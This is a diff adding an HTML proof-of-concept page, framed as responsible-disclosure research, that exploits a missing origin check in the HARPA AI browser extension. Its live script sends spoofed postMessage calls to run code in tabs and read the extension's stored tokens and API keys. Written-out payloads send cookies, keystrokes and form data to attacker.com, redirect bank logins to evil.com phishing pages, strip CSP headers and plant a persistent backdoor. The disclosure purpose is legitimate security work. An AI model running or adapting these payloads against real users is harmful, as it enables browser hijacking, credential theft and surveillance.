@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HARPA AI Extension - Security PoC (Defensive Research)</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
+    h1 { color: #ff3333; margin-bottom: 10px; }
+    h2 { color: #ffaa00; margin: 20px 0 10px; }
+    .warning { background: #330000; border: 2px solid #ff0000; padding: 15px; margin: 10px 0; color: #ff6666; }
+    .step { background: #0d1117; border: 1px solid #30363d; padding: 15px; margin: 10px 0; border-radius: 6px; }
+    .step-header { color: #58a6ff; font-weight: bold; margin-bottom: 8px; }
+    .log { background: #000; border: 1px solid #333; padding: 10px; margin: 5px 0; max-height: 200px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; }
+    .success { color: #3fb950; }
+    .fail { color: #f85149; }
+    .info { color: #58a6ff; }
+    .data { color: #d2a8ff; }
+    button { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 8px 16px; cursor: pointer; margin: 5px; font-family: monospace; }
+    button:hover { background: #30363d; }
+    code { background: #161b22; padding: 2px 6px; border-radius: 3px; color: #ff7b72; }
+    .diagram { background: #0d1117; padding: 15px; border: 1px dashed #30363d; margin: 10px 0; color: #8b949e; }
+  </style>
+</head>
+<body>
+
+  <h1>HARPA AI v9.8.0 — L9 Attack Surface PoC</h1>
+  <div class="warning">
+    FOR DEFENSIVE SECURITY RESEARCH ONLY — Responsible Disclosure PoC<br>
+    This page demonstrates how ANY website can exploit the HARPA AI extension.<br>
+    The victim only needs to VISIT this page. No clicks required.
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 0: HOW THE ATTACK WORKS (VISUAL EXPLANATION)             -->
+  <!-- ============================================================ -->
+
+  <h2>How The Attack Works</h2>
+  <div class="diagram">
+<pre>
+NORMAL browser security model:
+  ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
+  │  Website A   │  X  │  Website B   │  X  │  Extension   │
+  │ (attacker)   │────►│ (bank.com)   │────►│  (HARPA AI)  │
+  └─────────────┘     └─────────────┘     └─────────────┘
+  Websites CANNOT talk to each other or to extensions directly.
+
+WHAT HARPA BROKE:
+  ┌─────────────┐  postMessage("*")  ┌─────────────┐  chrome.runtime  ┌─────────────┐
+  │  Website A   │──────────────────►│  cs.js       │────────────────►│  bg.js       │
+  │ (attacker)   │  no origin check  │  (content    │  forwards ALL   │  (background │
+  │              │◄──────────────────│   script)    │◄────────────────│   service    │
+  │  GETS RESULT │  postMessage("*") │  on EVERY    │  messages back  │   worker)    │
+  └─────────────┘                    │  website     │                 │              │
+                                     └─────────────┘                 │  Has access: │
+                                                                     │  • cookies   │
+                                                                     │  • scripting │
+                                                                     │  • tabs      │
+                                                                     │  • network   │
+                                                                     │  • storage   │
+                                                                     └─────────────┘
+
+WHY IT WORKS:
+  1. cs.js runs on EVERY website (manifest: "*://*/*")
+  2. cs.js listens to window.postMessage — ANY page can send messages
+  3. The ONLY check is: message.$bus === true && message.appName === "__app_hrp"
+     (a hardcoded string anyone can copy)
+  4. cs.js forwards messages to bg.js (the privileged background)
+  5. bg.js executes the command and sends results back
+  6. Results come back via postMessage("*") — attacker receives them
+</pre>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 1: DETECT IF HARPA IS INSTALLED                          -->
+  <!-- ============================================================ -->
+
+  <h2>Step 1: Detect HARPA AI Installation (Fingerprinting)</h2>
+  <div class="step">
+    <div class="step-header">How: Extension exposes web_accessible_resources to ALL origins</div>
+    <p>The manifest.json declares resources accessible from any website:</p>
+    <code>"web_accessible_resources": [{"resources": ["nj.js", ...], "matches": ["*://*/*"]}]</code>
+    <p style="margin-top:8px">Any page can probe for these files to detect installation:</p>
+    <div class="log" id="log-detect"></div>
+    <button onclick="detectHarpa()">Run Detection</button>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 2: SEND MESSAGE TO EXTENSION VIA postMessage             -->
+  <!-- ============================================================ -->
+
+  <h2>Step 2: Talk to Extension (The Core Vulnerability)</h2>
+  <div class="step">
+    <div class="step-header">How: postMessage with spoofed bus identity — NO origin validation</div>
+    <p>The content script (cs.js) listens to <code>window.addEventListener("message")</code></p>
+    <p>It checks ONLY: <code>e.$bus === true && e.appName === "__app_hrp"</code></p>
+    <p>Any website can send this. There is NO <code>event.origin</code> check.</p>
+
+    <div class="diagram">
+<pre>
+// This is ALL you need to talk to the extension from any website:
+
+window.postMessage({
+  $bus: true,                    // ← pretend to be the bus
+  appName: "__app_hrp",          // ← hardcoded app name (public knowledge)
+  locus: "nj",                  // ← pretend to be the injected script
+  name: "ANY_HANDLER_NAME",     // ← which bg.js handler to call
+  args: [...]                   // ← arguments to pass
+}, "*");
+
+// That's it. The content script forwards this to chrome.runtime.sendMessage()
+// which reaches the PRIVILEGED background service worker.
+</pre>
+    </div>
+
+    <p style="margin-top:10px"><b>Test: Get tab ID (proves we can talk to the extension)</b></p>
+    <div class="log" id="log-tabid"></div>
+    <button onclick="getTabId()">Get Tab ID</button>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 3: ARBITRARY CODE EXECUTION                              -->
+  <!-- ============================================================ -->
+
+  <h2>Step 3: Execute JavaScript in ANY Tab (RCE)</h2>
+  <div class="step">
+    <div class="step-header">How: engine.executeJs → chrome.scripting.executeScript(MAIN world)</div>
+    <p>The bg.js handler <code>engine.executeJs(tabId, code)</code> calls:</p>
+
+    <div class="diagram">
+<pre>
+// bg.js — _executeJs handler (ACTUAL DECOMPILED CODE):
+
+async _executeJs(tabId, code) {
+  await chrome.scripting.executeScript({
+    target: { tabId: tabId },         // ← ANY tab
+    world: "MAIN",                    // ← full page context
+    args: [code],
+    injectImmediately: true,
+    func: e => {
+      try {
+        new Function(e)()             // ← executes attacker's code
+      } catch(t) {
+        // If CSP blocks new Function(), use DOM bypass:
+        if (t.message.includes("Content Security Policy")) {
+          const t = document.createElement("div");
+          t.setAttribute("onreset", e);    // ← CSP bypass trick
+          t.dispatchEvent(new Event("reset"));
+        }
+      }
+    }
+  })
+}
+
+// WHAT THIS MEANS:
+// An attacker sends: engine.executeJs(tabId, "document.cookie")
+// bg.js runs chrome.scripting.executeScript in that tab
+// The code runs with FULL page privileges
+// Even CSP-protected sites get bypassed via the onreset trick
+</pre>
+    </div>
+
+    <p><b>Test: Execute harmless alert in THIS tab</b></p>
+    <div class="log" id="log-rce"></div>
+    <button onclick="testRCE()">Test Code Execution (alert only)</button>
+
+    <p style="margin-top:10px"><b>What an attacker would do instead:</b></p>
+    <div class="diagram">
+<pre>
+// Steal cookies from bank.com (if victim has a tab open):
+engine.executeJs(bankTabId,
+  "fetch('https://attacker.com/steal?c=' + document.cookie)")
+
+// Inject keylogger into any page:
+engine.executeJs(tabId, `
+  document.addEventListener('keydown', e => {
+    fetch('https://attacker.com/keys?k=' + e.key)
+  })
+`)
+
+// Steal form data (passwords, credit cards):
+engine.executeJs(tabId, `
+  document.querySelectorAll('input').forEach(i => {
+    fetch('https://attacker.com/form?name=' + i.name + '&val=' + i.value)
+  })
+`)
+</pre>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 4: STEAL EXTENSION STATE (API KEYS, TOKENS)              -->
+  <!-- ============================================================ -->
+
+  <h2>Step 4: Steal All Extension Data (API Keys, Tokens, Settings)</h2>
+  <div class="step">
+    <div class="step-header">How: store.getBgState returns ENTIRE background state</div>
+
+    <div class="diagram">
+<pre>
+// The "store.getBgState" handler returns the complete MobX state tree.
+// This includes:
+//   - OpenAI access tokens (ChatGPT session)
+//   - Claude.ai session data
+//   - User's API keys (stored in grid)
+//   - JWT authentication token
+//   - All user settings and preferences
+//   - Chat history references
+//   - Billing/subscription data
+
+window.postMessage({
+  $bus: true,
+  appName: "__app_hrp",
+  locus: "nj",
+  name: "store.getBgState",
+  args: [],
+  reqId: "steal-state-123"
+}, "*");
+
+// Response comes back via postMessage("*") — attacker receives it!
+</pre>
+    </div>
+
+    <div class="log" id="log-state"></div>
+    <button onclick="stealState()">Request Extension State</button>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 5: NETWORK MITM                                          -->
+  <!-- ============================================================ -->
+
+  <h2>Step 5: Man-in-the-Middle Any Website (Network Hijack)</h2>
+  <div class="step">
+    <div class="step-header">How: netRules.register → chrome.declarativeNetRequest</div>
+
+    <div class="diagram">
+<pre>
+// Redirect bank.com login page to phishing site:
+
+window.postMessage({
+  $bus: true,
+  appName: "__app_hrp",
+  locus: "nj",
+  name: "netRules.register",
+  args: [{
+    condition: {
+      urlFilter: "bank.example.com/login",
+      resourceTypes: ["main_frame"]
+    },
+    action: {
+      type: "redirect",
+      redirect: { url: "https://evil-phishing-site.com/fake-bank" }
+    }
+  }]
+}, "*");
+
+// NOW: Every time the victim navigates to bank.com/login,
+// Chrome silently redirects to the attacker's phishing page.
+// The user sees nothing wrong — the redirect happens at the browser level.
+
+// OTHER USES:
+// - Redirect JavaScript files to inject malicious code
+// - Strip security headers (CSP, HSTS, X-Frame-Options)
+// - Block anti-fraud/anti-malware script loading
+// - Redirect OAuth callbacks to steal tokens
+</pre>
+    </div>
+
+    <div class="log" id="log-mitm"></div>
+    <button onclick="showMITM()">Show MITM Payload (display only)</button>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 6: PERSISTENT BACKDOOR                                   -->
+  <!-- ============================================================ -->
+
+  <h2>Step 6: Install Persistent Backdoor (Survives Tab Close)</h2>
+  <div class="step">
+    <div class="step-header">How: timer.setInterval + utils.ls.set + runner.enqueueTasks</div>
+
+    <div class="diagram">
+<pre>
+// PROBLEM: Normally when the victim closes the attacker's tab, the attack stops.
+// SOLUTION: Use the extension's own timer and storage APIs for persistence.
+
+// Step 6a: Store backdoor config in extension's chrome.storage.local
+window.postMessage({
+  $bus: true, appName: "__app_hrp", locus: "nj",
+  name: "utils.ls.set",
+  args: ["backdoor_config", {
+    c2Server: "https://attacker.com/c2",
+    interval: 60000,
+    installed: Date.now()
+  }]
+}, "*");
+
+// Step 6b: Set a recurring timer in the background service worker
+window.postMessage({
+  $bus: true, appName: "__app_hrp", locus: "nj",
+  name: "timer.setInterval",
+  args: ["beacon_callback", 60000]   // runs every 60 seconds
+}, "*");
+
+// Step 6c: Import a malicious automation task
+window.postMessage({
+  $bus: true, appName: "__app_hrp", locus: "nj",
+  name: "runner.enqueueTasks",
+  args: [{ /* task definition that runs periodically */ }]
+}, "*");
+
+// NOW: The attacker's page can be closed.
+// The backdoor runs INSIDE the extension's service worker.
+// It persists until the extension is uninstalled.
+</pre>
+    </div>
+
+    <div class="log" id="log-persist"></div>
+    <button onclick="showPersistence()">Show Persistence Payload (display only)</button>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- STEP 7: FULL ATTACK FLOW                                      -->
+  <!-- ============================================================ -->
+
+  <h2>Complete Attack: What Happens When Victim Visits This Page</h2>
+  <div class="step">
+    <div class="step-header">Zero-click, fully automated attack chain</div>
+
+    <div class="diagram">
+<pre>
+TIMELINE OF ATTACK (zero user interaction):
+
+  T+0ms     Victim loads attacker's page (via ad, link, compromised site)
+            ┌──────────────────────────────────────────────────┐
+            │  cs.js is ALREADY running on the page            │
+            │  (it runs on ALL websites due to "*://*/*")      │
+            └──────────────────────────────────────────────────┘
+
+  T+100ms   Attacker's JS detects HARPA installation
+            ┌──────────────────────────────────────────────────┐
+            │  Probe for chrome-extension://[id]/nj.js         │
+            │  Extension ID is public (Chrome Web Store)       │
+            └──────────────────────────────────────────────────┘
+
+  T+200ms   Get tab information
+            ┌──────────────────────────────────────────────────┐
+            │  postMessage → bus.getTabData                    │
+            │  Response: {tabId: 42, windowId: 1}              │
+            └──────────────────────────────────────────────────┘
+
+  T+300ms   Steal all stored credentials
+            ┌──────────────────────────────────────────────────┐
+            │  postMessage → store.getBgState                  │
+            │  Response: {OpenAI tokens, API keys, JWT, ...}   │
+            │  → Exfiltrated to attacker's server              │
+            └──────────────────────────────────────────────────┘
+
+  T+400ms   Install network interception rules
+            ┌──────────────────────────────────────────────────┐
+            │  postMessage → netRules.register                 │
+            │  Redirects: banking sites → phishing pages       │
+            │  Strips: CSP, HSTS, X-Frame-Options headers      │
+            └──────────────────────────────────────────────────┘
+
+  T+500ms   Inject keylogger into all open tabs
+            ┌──────────────────────────────────────────────────┐
+            │  For each tab:                                   │
+            │    postMessage → engine.executeJs(tabId, keylogger)│
+            │  Captures: passwords, credit cards, messages      │
+            └──────────────────────────────────────────────────┘
+
+  T+600ms   Steal cookies from high-value domains
+            ┌──────────────────────────────────────────────────┐
+            │  postMessage → engine.executeJs in bank/email tabs│
+            │  document.cookie → exfiltrate session cookies     │
+            │  OR: Use screenshotter.fetch for cross-origin     │
+            └──────────────────────────────────────────────────┘
+
+  T+700ms   Install persistent backdoor
+            ┌──────────────────────────────────────────────────┐
+            │  postMessage → utils.ls.set (persist config)     │
+            │  postMessage → timer.setInterval (recurring)     │
+            │  postMessage → runner.enqueueTasks (automation)   │
+            │  Backdoor runs in service worker forever          │
+            └──────────────────────────────────────────────────┘
+
+  T+800ms   Cover tracks
+            ┌──────────────────────────────────────────────────┐
+            │  Page looks completely normal to the user         │
+            │  No popups, no warnings, no visible indicators    │
+            │  All communication was via postMessage (no network│
+            │  requests visible in DevTools Network tab)        │
+            └──────────────────────────────────────────────────┘
+
+  RESULT:   Attacker now has:
+            ✓ All stored API keys and tokens
+            ✓ Session cookies for any domain
+            ✓ Keylogger running in every tab
+            ✓ Network MITM on banking/email sites
+            ✓ Persistent backdoor in extension
+            ✓ Ability to execute code in any tab at any time
+</pre>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- WHY EXISTING SECURITY DOESN'T HELP                           -->
+  <!-- ============================================================ -->
+
+  <h2>Why Browser Security Doesn't Protect Against This</h2>
+  <div class="step">
+    <div class="diagram">
+<pre>
+SECURITY MECHANISM              WHY IT FAILS HERE
+─────────────────────────────────────────────────────────────────
+Same-Origin Policy              postMessage is DESIGNED to be cross-origin.
+                                The vulnerability is that HARPA doesn't check
+                                event.origin — it accepts from ANY origin.
+
+Content Security Policy         HARPA's bg.js has a FALLBACK that bypasses CSP:
+                                  1. Try new Function(code) first
+                                  2. If CSP blocks it → use onreset DOM trick
+                                Also: HARPA disables Trusted Types on ALL sites.
+
+Manifest V3 restrictions        MV3 removed eval() from background scripts, but
+                                HARPA uses chrome.scripting.executeScript with
+                                world:"MAIN" + new Function() INSIDE the injected
+                                function. The eval happens in the PAGE context,
+                                not the service worker — MV3 doesn't block this.
+
+Site Isolation                  Doesn't matter — chrome.scripting.executeScript
+                                runs in the TARGET tab's process. The extension
+                                has permission to inject into ANY tab.
+
+Extension permissions prompt    User already granted permissions at install time.
+                                The user trusted the extension, not the attacker's
+                                website. The website BORROWS the extension's power.
+
+Network monitoring (DevTools)   postMessage is IN-PROCESS. It never hits the
+                                network. DevTools Network tab shows NOTHING.
+                                Only the final exfiltration fetch is visible.
+</pre>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- INTERACTIVE DEMO SCRIPTS                                      -->
+  <!-- ============================================================ -->
+
+  <script>
+    // ================================================================
+    // UTILITY: Log output to a specific panel
+    // ================================================================
+    function log(elementId, message, className = '') {
+      const el = document.getElementById(elementId);
+      const line = document.createElement('div');
+      line.className = className;
+      line.textContent = `[${new Date().toISOString().split('T')[1].slice(0,8)}] ${message}`;
+      el.appendChild(line);
+      el.scrollTop = el.scrollHeight;
+    }
+
+    // ================================================================
+    // UTILITY: Listen for postMessage responses from the extension
+    // ================================================================
+    const pendingCallbacks = {};
+
+    window.addEventListener("message", (event) => {
+      const data = event.data;
+      if (!data) return;
+
+      // Bus response (has resId matching our request)
+      if (data.resId && pendingCallbacks[data.resId]) {
+        pendingCallbacks[data.resId](data.result);
+        delete pendingCallbacks[data.resId];
+      }
+    });
+
+    // ================================================================
+    // UTILITY: Send a spoofed bus message and get response
+    // ================================================================
+    function sendBusMessage(name, args = [], callback = null) {
+      const reqId = `poc-${Date.now()}-${Math.random().toString(36).slice(2)}`;
+
+      if (callback) {
+        pendingCallbacks[reqId] = callback;
+        // Timeout after 5 seconds
+        setTimeout(() => {
+          if (pendingCallbacks[reqId]) {
+            pendingCallbacks[reqId]("TIMEOUT - no response (extension may not be installed)");
+            delete pendingCallbacks[reqId];
+          }
+        }, 5000);
+      }
+
+      // THIS IS THE ATTACK: a simple postMessage with spoofed identity
+      window.postMessage({
+        $bus: true,                // pretend to be the internal bus
+        appName: "__app_hrp",      // hardcoded extension identifier
+        locus: "nj",               // pretend to be the injected page script
+        name: name,                // which handler to call in bg.js
+        args: args,                // arguments to pass
+        reqId: reqId               // request ID for response matching
+      }, "*");
+
+      return reqId;
+    }
+
+    // ================================================================
+    // STEP 1: Detect HARPA installation via web-accessible resources
+    // ================================================================
+    function detectHarpa() {
+      log('log-detect', 'Probing for HARPA AI extension...', 'info');
+
+      // The extension ID is public: eanggfilgoajaocelnaflolkadkeghjp
+      const extId = 'eanggfilgoajaocelnaflolkadkeghjp';
+      const probeUrl = `chrome-extension://${extId}/nj.js`;
+
+      log('log-detect', `Probing: ${probeUrl}`, 'info');
+
+      // Method 1: Try to fetch a web-accessible resource
+      const img = new Image();
+      img.onload = () => {
+        log('log-detect', 'HARPA AI DETECTED — extension is installed!', 'success');
+        log('log-detect', `Extension ID: ${extId}`, 'data');
+      };
+      img.onerror = () => {
+        log('log-detect', 'Image probe failed (expected for .js files)', 'info');
+        log('log-detect', 'Alternative: check if cs.js injected nj.js into this page', 'info');
+
+        // Method 2: Check if the extension's globals exist
+        if (window.__app_hrp || document.querySelector('__hrp__')) {
+          log('log-detect', 'HARPA AI DETECTED via DOM markers!', 'success');
+        } else {
+          log('log-detect', 'Trying postMessage probe (most reliable)...', 'info');
+          // Method 3: Send a bus message and see if we get a response
+          sendBusMessage("bus.getTabData", [], (result) => {
+            if (result && result !== "TIMEOUT - no response (extension may not be installed)") {
+              log('log-detect', 'HARPA AI DETECTED via bus response!', 'success');
+              log('log-detect', `Tab ID: ${JSON.stringify(result)}`, 'data');
+            } else {
+              log('log-detect', 'HARPA AI not detected (not installed or disabled)', 'fail');
+            }
+          });
+        }
+      };
+      img.src = probeUrl;
+    }
+
+    // ================================================================
+    // STEP 2: Get tab ID (proves communication with extension)
+    // ================================================================
+    function getTabId() {
+      log('log-tabid', 'Sending spoofed bus message: bus.getTabData', 'info');
+      log('log-tabid', 'Payload: {$bus:true, appName:"__app_hrp", locus:"nj", name:"bus.getTabData"}', 'data');
+
+      sendBusMessage("bus.getTabData", [], (result) => {
+        if (result && typeof result === 'object') {
+          log('log-tabid', `GOT RESPONSE FROM EXTENSION!`, 'success');
+          log('log-tabid', `Tab ID: ${result.tabId}`, 'data');
+          log('log-tabid', `Window ID: ${result.windowId}`, 'data');
+          log('log-tabid', `This proves: any website can communicate with HARPA's privileged background`, 'success');
+          window._pocTabId = result.tabId;
+        } else {
+          log('log-tabid', `No response: ${result}`, 'fail');
+        }
+      });
+    }
+
+    // ================================================================
+    // STEP 3: Test code execution (harmless alert only)
+    // ================================================================
+    function testRCE() {
+      if (!window._pocTabId) {
+        log('log-rce', 'Run "Get Tab ID" first to get the tab ID', 'fail');
+        return;
+      }
+
+      const tabId = window._pocTabId;
+      // HARMLESS DEMO: only shows an alert
+      const harmlessCode = `alert("PoC: Code executed in tab ${tabId} via HARPA AI extension vulnerability")`;
+
+      log('log-rce', `Sending: engine.executeJs(${tabId}, "alert(...)")`, 'info');
+      log('log-rce', 'This calls chrome.scripting.executeScript in bg.js', 'info');
+      log('log-rce', 'The code runs in MAIN world with full page access', 'info');
+
+      sendBusMessage("engine.executeJs", [tabId, harmlessCode], (result) => {
+        log('log-rce', `Response: ${JSON.stringify(result)}`, 'data');
+      });
+
+      log('log-rce', 'If you see an alert popup, the extension executed our code!', 'success');
+      log('log-rce', 'An attacker would inject: keyloggers, cookie stealers, crypto miners...', 'fail');
+    }
+
+    // ================================================================
+    // STEP 4: Request extension state (API keys, tokens)
+    // ================================================================
+    function stealState() {
+      log('log-state', 'Sending: store.getBgState', 'info');
+      log('log-state', 'This returns the ENTIRE MobX state tree from bg.js', 'info');
+
+      sendBusMessage("store.getBgState", [], (result) => {
+        if (result && typeof result === 'string') {
+          try {
+            const parsed = JSON.parse(result);
+            log('log-state', `GOT EXTENSION STATE! Keys: ${Object.keys(parsed).join(', ')}`, 'success');
+
+            // Show what data categories are exposed
+            if (parsed.ai) log('log-state', `  ai: Contains AI provider configs & tokens`, 'data');
+            if (parsed.billing) log('log-state', `  billing: JWT token, subscription data`, 'data');
+            if (parsed.settings) log('log-state', `  settings: All user preferences`, 'data');
+            if (parsed.grid) log('log-state', `  grid: API keys, node configuration`, 'data');
+            if (parsed.commands) log('log-state', `  commands: Custom automation commands`, 'data');
+
+            log('log-state', `Full state size: ${result.length} characters`, 'info');
+            log('log-state', 'An attacker would exfiltrate this entire object', 'fail');
+          } catch (e) {
+            log('log-state', `Got response (not JSON): ${String(result).substring(0, 200)}...`, 'data');
+          }
+        } else {
+          log('log-state', `Response: ${JSON.stringify(result)}`, 'data');
+        }
+      });
+    }
+
+    // ================================================================
+    // STEP 5: Show MITM payload (display only, does not execute)
+    // ================================================================
+    function showMITM() {
+      log('log-mitm', '=== MITM ATTACK PAYLOAD (NOT EXECUTED) ===', 'info');
+      log('log-mitm', '', '');
+      log('log-mitm', 'To redirect bank.com → phishing site:', 'data');
+      log('log-mitm', '  name: "netRules.register"', 'data');
+      log('log-mitm', '  args: [{ condition: {urlFilter:"bank.com/login",', 'data');
+      log('log-mitm', '          resourceTypes:["main_frame"]},', 'data');
+      log('log-mitm', '          action: {type:"redirect",', 'data');
+      log('log-mitm', '          redirect:{url:"https://evil.com/phish"}}}]', 'data');
+      log('log-mitm', '', '');
+      log('log-mitm', 'To strip CSP headers from all sites:', 'data');
+      log('log-mitm', '  name: "netRules.register"', 'data');
+      log('log-mitm', '  args: [{ condition: {resourceTypes:["main_frame"]},', 'data');
+      log('log-mitm', '          action: {type:"modifyHeaders",', 'data');
+      log('log-mitm', '          responseHeaders:[{header:"content-security-policy",', 'data');
+      log('log-mitm', '          operation:"remove"}]}}]', 'data');
+      log('log-mitm', '', '');
+      log('log-mitm', 'These payloads are NOT executed — display only for documentation', 'info');
+    }
+
+    // ================================================================
+    // STEP 6: Show persistence payload (display only)
+    // ================================================================
+    function showPersistence() {
+      log('log-persist', '=== PERSISTENCE PAYLOAD (NOT EXECUTED) ===', 'info');
+      log('log-persist', '', '');
+      log('log-persist', 'Step A - Write to chrome.storage.local:', 'data');
+      log('log-persist', '  name: "utils.ls.set"', 'data');
+      log('log-persist', '  args: ["__backdoor", {c2:"https://evil.com", ts:Date.now()}]', 'data');
+      log('log-persist', '', '');
+      log('log-persist', 'Step B - Set recurring timer in service worker:', 'data');
+      log('log-persist', '  name: "timer.setInterval"', 'data');
+      log('log-persist', '  args: ["beacon", 60000]', 'data');
+      log('log-persist', '', '');
+      log('log-persist', 'Step C - Enqueue automation task:', 'data');
+      log('log-persist', '  name: "runner.enqueueTasks"', 'data');
+      log('log-persist', '  args: [{ ... task config ... }]', 'data');
+      log('log-persist', '', '');
+      log('log-persist', 'These run INSIDE the extension service worker.', 'fail');
+      log('log-persist', 'They persist even after the attacker tab is closed.', 'fail');
+      log('log-persist', 'Only uninstalling the extension stops them.', 'fail');
+      log('log-persist', '', '');
+      log('log-persist', 'These payloads are NOT executed — display only for documentation', 'info');
+    }
+  </script>
+
+</body>
+</html>
